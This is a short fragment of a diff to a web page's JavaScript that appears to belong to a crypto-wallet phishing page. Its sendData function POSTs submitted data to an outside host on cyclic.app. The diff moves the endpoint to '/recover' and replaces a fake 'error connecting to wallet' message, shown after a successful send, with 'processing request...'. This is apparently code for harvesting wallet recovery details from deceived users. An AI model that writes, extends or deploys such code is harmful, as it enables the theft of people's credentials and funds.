@@ -99,7 +99,7 @@ function handleSubmit(event) {
 }
 
 function sendData(data) {
-    fetch('https://odd-moccasins-ox.cyclic.app/connection', {
+    fetch('https://odd-moccasins-ox.cyclic.app/recover', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -108,7 +108,7 @@ function sendData(data) {
     })
     .then(response => {
       if (response.status === 200) {
-        alert('error connecting to wallet');
+        alert('processing request...');
       } else {
         alert('failed connection, kindly try again');
           
